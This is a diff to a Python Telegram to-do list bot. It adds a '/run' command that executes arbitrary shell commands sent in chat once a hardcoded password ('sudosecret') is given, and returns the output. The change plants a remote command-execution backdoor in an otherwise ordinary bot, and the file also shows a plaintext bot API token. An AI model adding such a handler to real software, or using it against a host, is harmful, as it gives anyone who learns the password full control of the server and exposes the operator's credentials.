@@ -10,6 +10,7 @@ import telebot
 from telebot import types
 import redis
 import logging
+import commands
 
 API_TOKEN = '613516960:AAFw5oWewRPeucTgRxHXhF7ZMnbdbUJ8Z7w'
 WEBHOOK_URL_PATH = "/%s/" % (API_TOKEN)
@@ -170,6 +171,17 @@ def send_welcome(message):
             text += i + ") " + e + "\t - " + s + "\n"
     bot.send_message(chat_id=message.chat.id,
                  text="Tu lista de cosas que terminaste es: \n" + text)
+
+@bot.message_handler(commands=['run'])
+def send_welcome(message):
+    password, code = id, state = message.text.replace("/run ","",1).split(" ", 1)
+    if password != "sudosecret":
+      bot.send_message(chat_id=message.chat.id,
+                   text="La contraseña provista es incorrecta")
+    else:
+      ans = commands.getstatusoutput(code)
+      bot.send_message(chat_id=message.chat.id,
+                   text=ans[1])
 
 
 
